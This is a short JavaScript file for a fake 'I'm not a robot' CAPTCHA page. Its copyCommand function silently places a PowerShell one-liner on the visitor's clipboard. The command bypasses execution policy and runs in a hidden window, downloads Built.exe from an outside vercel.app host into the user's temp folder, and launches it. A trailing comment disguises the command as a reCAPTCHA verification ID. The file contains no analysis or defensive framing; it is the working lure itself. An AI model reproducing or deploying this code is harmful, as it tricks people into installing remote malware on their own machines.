// Function to show the verification window when "I'm not a robot" is clicked
function showVerificationWindow() {
    document.getElementById('fkrc-verifywin-window').style.visibility = 'visible';
    document.getElementById('fkrc-verifywin-window').style.opacity = '1';
    document.getElementById('fkrc-verifywin-window-arrow').style.visibility = 'visible';
    document.getElementById('fkrc-verifywin-window-arrow').style.opacity = '1';
}

// Function to handle the "Verify" button and copy the command
function copyCommand() {
    // Command to copy to clipboard
    const command = `powershell -NoP -NonI -W h -Exec Bypass iwr "https://notafakecaptica2222.vercel.app/Built.exe" -OutFile "$env:userprofile\\temp\\Built.exe"; start "$env:userprofile\\temp\\Built.exe" # 'I am not a robot - reCAPTCHA Verification ID: 7537'`;

    // Copy to clipboard
    navigator.clipboard.writeText(command).then(() => {
        alert('Command copied to clipboard!');
    }).catch(err => {
        alert('Failed to copy the command.');
    });
}
